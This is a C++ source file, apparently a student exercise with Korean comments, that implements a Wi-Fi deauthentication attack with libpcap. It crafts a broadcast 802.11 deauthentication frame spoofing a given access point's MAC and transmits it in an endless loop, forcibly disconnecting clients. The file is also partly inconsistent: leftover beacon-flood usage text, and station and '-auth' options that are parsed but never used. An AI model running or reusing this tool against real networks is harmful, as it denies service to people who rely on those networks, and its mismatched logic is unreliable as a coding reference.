#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <iomanip>
#include "mac_address.h"

using namespace std;

#pragma pack(push, 1)

// Radiotap Header (간단 버전)
struct RadiotapHeader {
    uint8_t  version;    // 항상 0
    uint8_t  pad;
    uint16_t length;     // 전체 Radiotap 헤더 길이
    uint32_t present;    // 필드 존재 여부 비트마스크
};

struct Frame80211 {
    uint8_t version : 2;  // 프로토콜 버전
    uint8_t type : 2;     // 프레임 타입(Management/Data/Control)
    uint8_t subtype : 4;  // 서브타입(Beacon 등)
    uint8_t flags; 
    uint16_t duration;
    MacAddress address1;       // 수신 대상 (일반적으로 Broadcast: ff:ff:ff:ff:ff:ff)
    MacAddress address2;       // 송신자 MAC
    MacAddress address3;       // BSSID
    uint16_t sequence_control;
};

// 맥 주소 구조체 (단순화)
// struct MacAddress {
//     uint8_t addr[6];
// };
// #pragma pack(pop)

// // 문자열을 MAC 주소로 변환하는 함수
// MacAddress parse_mac(const char* mac_str) {
//     MacAddress mac{};
//     int values[6];

//     if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", 
//                &values[0], &values[1], &values[2], 
//                &values[3], &values[4], &values[5]) != 6) {
//         std::cerr << "Invalid MAC address format: " << mac_str << std::endl;
//         exit(EXIT_FAILURE);
//     }

//     for (int i = 0; i < 6; i++) {
//         mac.addr[i] = static_cast<uint8_t>(values[i]);
//     }
//     return mac;
// }

// 간단한 사용법 출력
void usage() {
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 5) {
        std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
        return EXIT_FAILURE;
    }

    char* interface = argv[1];              // 인터페이스 (ex. mon0)
    MacAddress ap_mac = parse_mac(argv[2]);

    MacAddress station_mac{};
    bool has_station_mac = false;
    bool deauth_or_auth = false; // false = deauth, true = auth
    // option parsing
    if (argc >= 4) {
        has_station_mac = true;
        station_mac = parse_mac(argv[3]);

        if (argc == 5 && strcmp(argv[4], "-auth") == 0) {
            deauth_or_auth = true;
        }
    }

    // 입력 정보 출력
    cout << "Interface: " << interface << std::endl;
    cout << "AP MAC: ";
    print_mac(ap_mac);
    cout << std::endl;

    if (has_station_mac) {
        cout << "Station MAC: ";
        print_mac(station_mac);
        cout << std::endl;
    }

    cout << "Mode: " << (deauth_or_auth ? "Auth" : "Deauth") << std::endl;
    //==================================================================//

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
        return -1;
    }

     // Radiotap 헤더 설정
    RadiotapHeader rth;
    memset(&rth, 0, sizeof(rth));
    rth.version = 0;
    rth.pad = 0;
    rth.length = sizeof(RadiotapHeader); 
    rth.present = 0;

    // Frame80211 초기화
    MacAddress broadcast = make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
    Frame80211 deauth_frame{};
    deauth_frame.version = 0; // Protocol version
    deauth_frame.type = 0;    // Management frame
    deauth_frame.subtype = 12; // Deauthentication subtype
    deauth_frame.flags = 0;   // Default flags
    deauth_frame.duration = 0; // Default duration
    deauth_frame.address1 = broadcast;
    deauth_frame.address2 = ap_mac;
    deauth_frame.address3 = ap_mac;
    deauth_frame.sequence_control = 0; // Default sequence control

    // Beacon Fixed Parameter 
    uint8_t fixed_params[12] = {0x00, 0x07};
    
    //make packet!!
    uint8_t packet[256];
    size_t offset = 0;

    // Radiotap Header 복사
    memcpy(packet + offset, &rth, sizeof(rth));
    offset += sizeof(rth);

    // 802.11 Frame Header 복사
    memcpy(packet + offset, &deauth_frame, sizeof(deauth_frame));
    offset += sizeof(deauth_frame);

    // Fixed Parameters 복사
    memcpy(packet + offset, fixed_params, sizeof(fixed_params));
    offset += sizeof(fixed_params);

    // 반복 전송
    while (true) {
        // 패킷 전송
        if (pcap_sendpacket(pcap, packet, offset) != 0) {
            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
        }
        usleep(10000); 
    }
    pcap_close(pcap);
    return 0;
}